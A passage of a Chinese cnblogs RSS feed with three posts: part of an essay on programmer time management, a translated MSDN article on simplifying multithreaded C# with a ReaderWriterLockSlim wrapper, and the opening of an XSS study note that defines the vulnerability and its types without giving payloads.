&lt;p&gt;整合 vue.js ，把 vue.js 下载并整合到代码里，接下来完成逻辑代码编写，只花了二十分钟。之后开始调试，但在我的浏览器怎么样也没法调通，于是怀疑是浏览器版本问题，换了chrome/firefox 都还是不行之后，又怀疑是代码写得不对，重新编写代码..一通乱麻之后，才找到真正原因：引入其他框架冲突了..，通过网上介绍的办法解决了问题。&lt;br/&gt;一看手机，一个半小时过去了，距离一开始的计划，我花了两倍的时间！ 而且，我竟然还把外卖的事情给忘了..&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/242916/201903/242916-20190322223657848-1173452907.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;看，这就是一个跟时间管理有关的例子，不知道你会不会有似曾相识的感觉呢？&lt;br/&gt;所以我想说时间很难管理，本质上或许更多的来源于目标的不清晰、又或是意志力不够坚定、旧的坏习惯使然等等。&lt;/p&gt;
&lt;h2 id=&quot;是什么偷走了时间&quot;&gt;是什么偷走了时间&lt;/h2&gt;
&lt;p&gt;前面的例子，听起来更像是一个强迫症和重度拖延症患者的故事。但是在平时的工作里面，一定会有非常多的事情像洪水一样想要吞噬你的计划。&lt;br/&gt;比如：&lt;/p&gt;
&lt;h4 id=&quot;a.-各种打断式的会议&quot;&gt;A. 各种打断式的会议&lt;/h4&gt;
&lt;p&gt;事实上，有很多的会议都不是必须的，或者说有80%的会议里面，其中80%的时间都是不必要的。&lt;br/&gt;这听取起来好像耸人听闻，但仔细回想你参加过的每一个会议，最终剩余的价值是什么？ 会议纪要！没错，只有会议后的纪要能被记住并使用。&lt;br/&gt;那么会议纪要内容有多少，一般都不多，沟通效率非常高的话，10%的会议时间可能就足够了。&lt;br/&gt;打断式的会议，除了会议本身的时长之外，程序员可能还需要花费一定时间在大脑中做切换，而且这个时间比其他职业会高一些的。&lt;/p&gt;
&lt;h4 id=&quot;b.-缺斤少两的交付&quot;&gt;B. &quot;缺斤少两&quot;的交付&lt;/h4&gt;
&lt;p&gt;关于这点，偏向于指技术债务、或文档债务，技术债务呢，比如你的代码写得太随意，可靠性不好，心想着反正现在也没啥问题，就先这样吧。&lt;br/&gt;但在未来的某些场景下，问题被暴露出来了还是要你来修复(如果你跑路了可能另当别论)。文档债务也很常见，许多开发的不喜欢写文档，其实是懒，那么到后来，&lt;br/&gt;会不断的有人来问你，A是怎么回事，B又是怎么来的.. 烦不胜烦。这些都在你的计划内吗？&lt;br/&gt;一句话，出来混的，始终还是要还的！&lt;/p&gt;
&lt;h4 id=&quot;c.-邮件的魔力&quot;&gt;C. 邮件的魔力&lt;/h4&gt;
&lt;p&gt;当大家都喜欢上发邮件时，你看邮件，总会想要一下子把收件箱的未读邮件全部看完、每一封需要回复的都要回复完。&lt;br/&gt;甚至在干活的时候，是不是也会点开Outlook客户端去检查一下，生怕有漏..&lt;br/&gt;一次次的切换，会导致你不专心、走神，精神及代码质量低下.. 或者，让自己上下班临界时间处理邮件，是个办法。&lt;/p&gt;
&lt;h4 id=&quot;d.-座位上的叨扰&quot;&gt;D. 座位上的叨扰&lt;/h4&gt;
&lt;p&gt;总有些人，会特别喜欢面对面沟通，觉得这样效率是最高的。没错，&quot;你“的效率的确是提高了，但别人呢？&lt;br/&gt;这类现象发生在很多项目经理、产品经理身上，他们脱离技术工作已久，或许已经不会从别人的角度去思考问题了。&lt;br/&gt;那么对于他们来说，日常的工作就是面对面沟通，认为这已经不足为奇了。但对于程序员来说，长期以往可能是个噩梦！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/242916/201903/242916-20190322223714553-1800892920.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;上面的这些，都是我平时工作经历过的东西，而且相信，大多数人也正在经受这样的事情。&lt;br/&gt;可能小团队不会有，大中型企业会有，不善管理的部门很严重...&lt;/p&gt;
&lt;h2 id=&quot;有什么良药&quot;&gt;有什么良药&lt;/h2&gt;
&lt;p&gt;时间管理既然这么难，又有这么多的事情烦扰，那还做什么管理？&lt;br/&gt;我认为，尽管现阶段可能不会有什么包好的方法，但时间管理还是要做，不做，那跟咸鱼有什么分别呢？&lt;br/&gt;《高效能认识的七个习惯》、《番茄工作法图解》都是一些畅销书，为啥畅销，就是因为太多人都希望做好时间管理了。&lt;br/&gt;但光凭看书不行，还得实战、不停的修炼不是？ 那我炼了这么久，有啥心得体会呢？&lt;/p&gt;
&lt;h4 id=&quot;尝试给自己更多的时间尤其是学习类的目标给够预留的部分&quot;&gt;1. 尝试给自己更多的时间，尤其是学习类的目标给够预留的部分。&lt;/h4&gt;
&lt;h4 id=&quot;把目标写下来做分解一条条读一遍看看哪些重要哪些不重要最终只要重要的完成就好了&quot;&gt;2. 把目标写下来做分解，一条条读一遍看看哪些重要哪些不重要，最终只要重要的完成就好了。&lt;/h4&gt;
&lt;h4 id=&quot;认识时间不好管理的现实做好失败的准备尽量消除焦虑&quot;&gt;3. 认识时间不好管理的现实，做好失败的准备，尽量消除焦虑。&lt;/h4&gt;
&lt;h2 id=&quot;后记&quot;&gt;后记&lt;/h2&gt;
&lt;p&gt;你是一个重度拖延症患者，还是一个自我管理强人？对于时间管理，你怎么看呢，欢迎留言讨论&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/242916/201903/242916-20190322224256548-761655939.png&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Fri, 22 Mar 2019 14:40:00 +0000</pubDate>
<dc:creator>美码师</dc:creator>
<og:description>长期以来，时间管理一直被认为是 自我管理，团队管理，项目管理 的既关键又基础的手段，就连笔者本人也一直在崇尚时间管理的理念。 但是这里要讲的，不是什么鬼神方法论。而主要是对长时间以来学习和实践时间管理</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/littleatp/p/10581746.html</dc:identifier>
</item>
<item>
<title>【译】最大限度地降低多线程 C# 代码的复杂性 - 楚人Leo</title>
<link>http://www.cnblogs.com/leolion/p/10581723.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/leolion/p/10581723.html</guid>
<description>&lt;p&gt;分支或多线程编程是编程时最难最对的事情之一。这是由于它们的并行性质所致，即要求采用与使用单线程的线性编程完全不同的思维模式。对于这个问题，恰当类比就是抛接杂耍表演者，必须在空中抛接多个球，而不要让它们相互干扰。这是一项重大挑战。然而，通过正确的工具和思维模式，这项挑战是能应对的。&lt;/p&gt;
&lt;p&gt;本文将深入介绍我为了简化多线程编程和避免争用条件、死锁等其他问题而编写的一些工具。可以说，工具链以语法糖和神奇委托为依据。不过，引用伟大的爵士音乐家 Miles Davis 的话：“在音乐中，没有声音比有声音更重要。” 声音间断就产生了奇迹。&lt;/p&gt;
&lt;p&gt;从另一个角度来说，不一定是关乎可以编码什么，而是关乎可以选择不编码什么，因为你希望通过间断代码行产生一点奇迹。引用 Bill Gates 的一句话：“根据代码行数来衡量工作质量就像通过重量来衡量飞机质量一样。” 因此，我希望能帮助开发人员减少编码量，而不是教导开发人员如何编写更多代码。&lt;/p&gt;
&lt;h2&gt;同步挑战&lt;/h2&gt;
&lt;p&gt;在多线程编程方面遇到的第一个问题是，同步对共享资源的访问权限。当两个或多个线程共享对某个对象的访问权限且可能同时尝试修改此对象时，就会出现这个问题。当 C# 首次发布时，lock 语句实现了一种基本方法，可确保只有一个线程能访问指定资源（如数据文件），且效果很好。C# 中的 lock 关键字很容易理解，它独自颠覆了我们对这个问题的思考方式。&lt;/p&gt;
&lt;p&gt;不过，简单的 lock 存在一个主要缺陷：它不区分只读访问权限和写入访问权限。例如，可能要从共享对象中读取 10 个不同的线程，并且通过 System.Threading 命名空间中的 ReaderWriterLockSlim 类授权这些线程同时访问实例，而不导致问题发生。与 lock 语句不同，此类可便于指定代码是将内容写入对象，还是只从对象读取内容。这样一来，多个读取器可以同时进入，但在其他所有读写线程均已完成自己的工作前，拒绝任何写入代码访问。&lt;/p&gt;
&lt;p&gt;现在的问题是：如果使用 ReaderWriterLock 类，语法就会变得很麻烦，大量的重复代码既降低了可读性，又随时间变化增加了维护复杂性，并且代码中通常会分散有多个 try 和 finally 块。即使是简单的拼写错误，也可能会带来日后有时极难发现的灾难性影响。 &lt;/p&gt;
&lt;p&gt;通过将 ReaderWriterLockSlim 封装到简单的类中，这个问题瞬间解决，不仅重复代码不再会出现，而且还降低了小拼写错误毁一天劳动成果的风险。图 1 中的类完全基于 lambda 技巧。可以说，这就是对一些委托应用的语法糖（假设存在几个接口）。最重要的是，它在很大程度上有助于实现避免重复代码原则 (DRY)。&lt;/p&gt;
&lt;p&gt;图 1：封装 ReaderWriterLockSlim&lt;/p&gt;
&lt;div class=&quot;codeCaption&quot; readability=&quot;9&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; Synchronizer&amp;lt;TImpl, TIRead, TIWrite&amp;gt; &lt;span&gt;where&lt;/span&gt;&lt;span&gt; TImpl : TIWrite, TIRead {
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt;     ReaderWriterLockSlim _lock = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; ReaderWriterLockSlim ();
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt; &lt;span&gt;    TImpl _shared;
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt; 
&lt;span&gt; 5&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt;&lt;span&gt; Synchronizer (TImpl shared) {
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt;         _shared =&lt;span&gt; shared;
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt; 
&lt;span&gt; 9&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Read (Action&amp;lt;TIRead&amp;gt;&lt;span&gt; functor) {
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt; &lt;span&gt;        _lock.EnterReadLock ();
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;         &lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt; &lt;span&gt;            functor (_shared);
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt;         } &lt;span&gt;finally&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt; &lt;span&gt;            _lock.ExitReadLock ();
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;17&lt;/span&gt; 
&lt;span&gt;18&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Write (Action&amp;lt;TIWrite&amp;gt;&lt;span&gt; functor) {
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt; &lt;span&gt;        _lock.EnterWriteLock ();
&lt;/span&gt;&lt;span&gt;20&lt;/span&gt;         &lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;21&lt;/span&gt; &lt;span&gt;            functor (_shared);
&lt;/span&gt;&lt;span&gt;22&lt;/span&gt;         } &lt;span&gt;finally&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;23&lt;/span&gt; &lt;span&gt;            _lock.ExitWriteLock ();
&lt;/span&gt;&lt;span&gt;24&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;25&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;26&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;图 1 中只有 27 行代码，但却精妙简洁地确保对象跨多个线程进行同步。此类假定类型中有读取接口和写入接口。如果由于某种原因而无法更改需要将访问权限同步到的基础类实现，也可以重复模板类本身三次，通过这种方式使用它。基本用法如图 2 所示。&lt;/p&gt;
&lt;p&gt;图 2：使用 Synchronizer 类&lt;/p&gt;
&lt;div class=&quot;codeCaption&quot; readability=&quot;9&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; IReadFromShared {
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt;     &lt;span&gt;string&lt;/span&gt;&lt;span&gt; GetValue ();
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt; &lt;span&gt;}
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt; 
&lt;span&gt; 5&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; IWriteToShared {
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt;     &lt;span&gt;void&lt;/span&gt; SetValue (&lt;span&gt;string&lt;/span&gt;&lt;span&gt; value);
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt; &lt;span&gt;}
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt; 
&lt;span&gt; 9&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; MySharedClass : IReadFromShared, IWriteToShared {
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;     &lt;span&gt;string&lt;/span&gt;&lt;span&gt; _foo;
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt; 
&lt;span&gt;12&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;&lt;span&gt; GetValue () {
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt;&lt;span&gt; _foo;
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt; 
&lt;span&gt;16&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; SetValue (&lt;span&gt;string&lt;/span&gt;&lt;span&gt; value) {
&lt;/span&gt;&lt;span&gt;17&lt;/span&gt;         _foo =&lt;span&gt; value;
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt; &lt;span&gt;}
&lt;/span&gt;&lt;span&gt;20&lt;/span&gt; 
&lt;span&gt;21&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Foo (Synchronizer&amp;lt;MySharedClass, IReadFromShared, IWriteToShared&amp;gt;&lt;span&gt; sync) {
&lt;/span&gt;&lt;span&gt;22&lt;/span&gt;     sync.Write (x =&amp;gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;23&lt;/span&gt;         x.SetValue (&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;new value&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;24&lt;/span&gt; &lt;span&gt;    });
&lt;/span&gt;&lt;span&gt;25&lt;/span&gt;     sync.Read (x =&amp;gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;26&lt;/span&gt; &lt;span&gt;        Console.WriteLine (x.GetValue ());
&lt;/span&gt;&lt;span&gt;27&lt;/span&gt; &lt;span&gt;    })
&lt;/span&gt;&lt;span&gt;28&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&quot;codeCaption&quot; readability=&quot;10&quot;&gt;
&lt;p&gt;在图 2 的代码中，无论有多少线程在执行 Foo 方法，只要执行另一个 Read 或 Write 方法，就不会调用 Write 方法。不过，可以同时调用多个 Read 方法，而不必在代码中分散多个 try/catch/finally 语句，也不必不断重复相同的代码。我在此郑重声明，通过简单字符串来使用它是没有意义的，因为 System.String 不可变。我使用简单的字符串对象来简化示例。&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;基本思路是，必须将所有可以修改实例状态的方法都添加到 IWriteToShared 接口中。同时，应将所有只从实例读取内容的方法都添加到 IReadFromShared 接口中。通过将诸如此类的问题分散到两个不同的接口，并对基础类型实现这两个接口，可使用 Synchronizer 类来同步对实例的访问权限。这样一来，将访问权限同步到代码的做法变得更简单，并且基本上可以通过更具声明性的方式这样做。&lt;/p&gt;
&lt;p&gt;在多线程编程方面，语法糖可能会决定成败。调试多线程代码通常极为困难，并且创建同步对象的单元测试可能会是徒劳无功之举。&lt;/p&gt;
&lt;p&gt;如果需要，可以创建只包含一个泛型参数的重载类型，不仅继承自原始 Synchronizer 类，还将它的一个泛型参数作为类型参数三次传递到它的基类。这样一来，就不需要读取接口或写入接口了，因为可以直接使用类型的具体实现。不过，这种方法要求手动处理需要使用 Write 或 Read 方法的部分。此外，虽然它的安全性稍差一点，但确实可便于将无法更改的类包装到 Synchronizer 实例中。&lt;/p&gt;
&lt;h2&gt;用于分支的 lambda 集合&lt;/h2&gt;
&lt;p&gt;迈出第一步来使用神奇的 lambda（或在 C# 中称为“委托”）后，不难想象，可以利用它们完成更多操作。例如，反复出现的常见多线程主题是，让多个线程与其他服务器联系，以提取数据并将数据返回给调用方。&lt;/p&gt;
&lt;p&gt;最简单的例子就是，应用程序从 20 个网页读取数据，并在完成后将 HTML 返回给一个根据所有网页的内容创建某种聚合结果的线程。除非为每个检索方法都创建一个线程，否则此代码的运行速度比预期慢得多：99% 的所有执行时间可能会花在等待 HTTP 请求返回上。&lt;/p&gt;
&lt;p&gt;在一个线程上运行此代码的效率很低，并且线程创建语法非常容易出错。随着你支持多个线程及其助理对象，挑战变得更严峻，开发人员不得不在编写代码时使用重复代码。意识到可以创建委托集合和用于包装这些委托的类后，便能使用一个方法调用来创建所有线程。这样一来，创建线程就轻松多了。&lt;/p&gt;
&lt;p&gt;图 3 中的一段代码创建两个并行运行的此类 lambda。请注意，此代码实际上来自我的第一版 Lizzie 脚本语言的单元测试 (&lt;a href=&quot;http://bit.ly/2FfH5y8&quot;&gt;bit.ly/2FfH5y8&lt;/a&gt;)。&lt;/p&gt;
&lt;p&gt;图 3：创建 lambda&lt;/p&gt;
&lt;div class=&quot;codeCaption&quot; readability=&quot;9&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; ExecuteParallel_1 () {
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt;     &lt;span&gt;var&lt;/span&gt; sync = &lt;span&gt;new&lt;/span&gt; Synchronizer&amp;lt;&lt;span&gt;string&lt;/span&gt;, &lt;span&gt;string&lt;/span&gt;, &lt;span&gt;string&lt;/span&gt;&amp;gt; (&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;initial_&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt; 
&lt;span&gt; 4&lt;/span&gt;     &lt;span&gt;var&lt;/span&gt; actions = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Actions ();
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;     actions.Add (() =&amp;gt; sync.Assign ((res) =&amp;gt; res + &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;foo&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;));
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt;     actions.Add (() =&amp;gt; sync.Assign ((res) =&amp;gt; res + &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;bar&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;));
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt; 
&lt;span&gt; 8&lt;/span&gt; &lt;span&gt;    actions.ExecuteParallel ();
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt; 
&lt;span&gt;10&lt;/span&gt;     &lt;span&gt;string&lt;/span&gt; result = &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;     sync.Read (&lt;span&gt;delegate&lt;/span&gt; (&lt;span&gt;string&lt;/span&gt; val) { result =&lt;span&gt; val; });
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt;     Assert.AreEqual (&lt;span&gt;true&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;initial_foobar&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; == result || result == &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;initial_barfoo&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;仔细看看这段代码便会发现，计算结果并未假定我的两个 lambda 的执行存先后顺序。执行顺序并未明确指定，并且这些 lambda 是在不同的线程上执行。这是因为，使用图 3 中的 Actions 类，可以向它添加委托，这样稍后就能决定是要并行执行委托，还是按顺序执行委托。&lt;/p&gt;
&lt;p&gt;为此，必须使用首选机制创建并执行许多 lambda。在图 3 中可以看到前面提到的 Synchronizer 类，用于同步对共享字符串资源的访问权限。不过，它对 Synchronizer 使用了新方法 Assign，我并未在图 1中的列表内为 Synchronizer 类添加此方法。Assign 方法使用前面 Write 和 Read 方法中使用的相同“lambda 技巧”。&lt;/p&gt;
&lt;p&gt;若要研究 Actions 类的实现，请务必下载 Lizzie 版本 0.1，因为我在后面推出的版本中完全重写了代码，使之成为独立编程语言。&lt;/p&gt;
&lt;h2&gt;C# 中的函数式编程&lt;/h2&gt;
&lt;p&gt;大多数开发人员往往认为，C# 几乎与面向对象的编程 (OOP) 同义或至少密切相关，事实显然如此。不过，通过重新思考如何使用 C#，并深入了解它的各方面功能，解决一些问题就变得更加简单了。目前形式的 OOP 不太易于重用，原因很多是因为它是强类型。&lt;/p&gt;
&lt;p&gt;例如，如果重用一个类，就不得不重用初始类引用的每个类（在两种情况下，类都是通过组合和继承进行使用）。此外，类重用还会强制重用这些第三方类引用的所有类等。如果这些类是在不同的程序集中实现，必须添加各种各样的程序集，才能获得对一个类型上单个方法的访问权限。&lt;/p&gt;
&lt;p&gt;我曾经看过一个可以说明这个问题的类比：“虽然想要的是香蕉，但最终得到的是手拿香蕉的大猩猩，以及大猩猩所居住的热带雨林。” 将这种情况与使用更动态的语言（如 JavaScript）进行重用做比较，后者并不关心类型，只要它实现函数本身使用的函数即可。通过略微宽松类型方法生成的代码更灵活、更易于重用。委托可以实现这一点。&lt;/p&gt;
&lt;p&gt;可使用 C# 来改善跨多个项目重用代码的过程。只需要理解函数或委托也可以是对象，并且可以通过弱类型方式控制这些对象的集合。&lt;/p&gt;
&lt;p&gt;早在 2018 年 11 月发行的《MSDN 杂志》中，我发表过一篇标题为“使用符号委托创建你自己的脚本语言”的文章 (&lt;a href=&quot;http://msdn.com/magazine/mt830373&quot;&gt;msdn.com/magazine/mt830373&lt;/a&gt;)。本文中提到的有关委托的思路是在这篇文章的基础之上形成。本文还介绍了 Lizzie，这是我的自制脚本语言，它的存在归功于这种以委托为中心的思维模式。如果我使用 OOP 规则创建了 Lizzie，我会认为，它在大小上可能至少大一个数量级。&lt;/p&gt;
&lt;p&gt;当然，如今 OOP 和强类型处于主导地位，想要找到一个主要必需技能不要求它的职位描述，几乎是不可能的。我在此郑重声明，我创建 OOP 代码的时间已超过 25 年，所以，我与任何人一样都会因为对强类型有偏见而感到内疚。然而，如今我在编码方法上更加务实，对类层次结构的最终外观失去兴趣。&lt;/p&gt;
&lt;p&gt;并不是我不欣赏外观精美的类层次结构，而是收益递减。添加到层次结构中的类越多，它就变得越臃肿，直到因不堪重压而崩溃。有时，卓越的设计只用很少的方法、更少的类和大多数松散耦合的函数，这样就可以轻松扩展代码，也就不需要“引入大猩猩和热带雨林”了。&lt;/p&gt;
&lt;p&gt;回到本文反复出现的主题（从 Miles Davis 的音乐方法中获得灵感）：少即是多（“没有声音比有声音更重要”）。 代码也不例外。间断代码行往往会产生奇迹，最佳解决方案的衡量依据更多是不编码什么，而不是编码什么。连傻瓜也可以将喇叭吹响，但只有为数不多的人才能用喇叭吹奏出音乐。像 Miles 这样能创造出奇迹的人就更少了。&lt;/p&gt;

&lt;hr/&gt;&lt;p&gt; 原文作者：Thomas Hansen&lt;/p&gt;
&lt;p&gt;原文地址：&lt;a title=&quot;Minimize Complexity in Multithreaded C# Code&quot; href=&quot;https://msdn.microsoft.com/zh-cn/magazine/mt833270&quot; target=&quot;_blank&quot;&gt;Minimize Complexity in Multithreaded C# Code&lt;/a&gt;&lt;a href=&quot;http://csharpindepth.com/Articles/General/Singleton.aspx#performance&quot;&gt;&lt;br/&gt;&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Fri, 22 Mar 2019 14:34:00 +0000</pubDate>
<dc:creator>楚人Leo</dc:creator>
<og:description>分支或多线程编程是编程时最难最对的事情之一。这是由于它们的并行性质所致，即要求采用与使用单线程的线性编程完全不同的思维模式。对于这个问题，恰当类比就是抛接杂耍表演者，必须在空中抛接多个球，而不要让它们</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/leolion/p/10581723.html</dc:identifier>
</item>
<item>
<title>前端Hack之XSS攻击个人学习笔记 - Yunen的博客</title>
<link>http://www.cnblogs.com/yunen/p/10581320.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/yunen/p/10581320.html</guid>
<description>&lt;p&gt;**&lt;br/&gt;       此篇系本人两周来学习XSS的一份个人总结，实质上应该是一份笔记，方便自己日后重新回来复习，文中涉及到的文章我都会在末尾尽可能地添加上，此次总结是我在学习过程中所写，如有任何错误，敬请各位读者斧正。其中有许多内容属于相关书籍、文章的部分摘取，如有侵权，请联系我修改。(asp-php#foxmail.com)&lt;br/&gt;**&lt;br/&gt;&lt;/p&gt;
&lt;h2 id=&quot;什么是xss&quot;&gt;1) 什么是XSS?&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;&lt;br/&gt;       XSS(Cross-Site Script,跨站脚本)是由于web应用程序对用户的输入过滤不足而产生的一种漏洞。攻击者可以利用网站漏洞把恶意的脚本代码注入到网页之中，当其他用户浏览这些带有恶意代码的网页时就会执行其中的恶意代码，对受害者产生各种攻击。&lt;br/&gt;&lt;/strong&gt;&lt;br/&gt;       如果对以上描述还不是很了解的话，可以参考&lt;a href=&quot;https://baike.baidu.com/item/xss/917356&quot;&gt;百度百科&lt;/a&gt;&lt;br/&gt;       在&lt;strong&gt;余弦大大&lt;/strong&gt;和&lt;strong&gt;xisigr大大&lt;/strong&gt;的书籍《Web前端安全技术揭秘》第三章中这样说道：&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;跨站脚本的重点不在“跨站”上，而应该在“脚本”上...因为这个“跨”实际上属于浏览器的特性，而不是缺陷，造成“跨”的假象是因为绝大多数的XSS攻击都会采用嵌入一段远程或者说第三方域上的脚本资源。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;       确实，当攻击者的服务器上的js嵌入到受害者的页面，至于接下来的攻击就是关于“脚本”的事了。&lt;/p&gt;
&lt;h2 id=&quot;xss可以带来哪些危害&quot;&gt;2) XSS可以带来哪些危害？&lt;/h2&gt;
&lt;p&gt;       对于XSS攻击的危害，大多数的人们却没有正确的认识，实际上攻击者可以利用XSS攻击造成巨大的危害。比如：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;网页挂马;&lt;/li&gt;
&lt;li&gt;盗取Cookie;&lt;/li&gt;
&lt;li&gt;DoS攻击;&lt;/li&gt;
&lt;li&gt;钓鱼攻击;&lt;/li&gt;
&lt;li&gt;蠕虫攻击;&lt;/li&gt;
&lt;li&gt;劫持用户web行为;&lt;/li&gt;
&lt;li&gt;结合CSRF进行针对性攻击;&lt;/li&gt;
&lt;li&gt;······&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;这些都是可以利用XSS漏洞来达成的。&lt;/p&gt;
&lt;h2 id=&quot;xss类型&quot;&gt;3) XSS类型&lt;/h2&gt;
&lt;p&gt;目前的XSS总共可以分为三种类型：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;反射型(也叫非持久型)&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;存储型(也叫持久型)&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;DOM型&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;PS：前两种XSS都会与服务器产生交互，后一种不会产生交互。(某安全大佬面试)&lt;/p&gt;
&lt;h3 id=&quot;反射型xss&quot;&gt;反射型XSS&lt;/h3&gt;
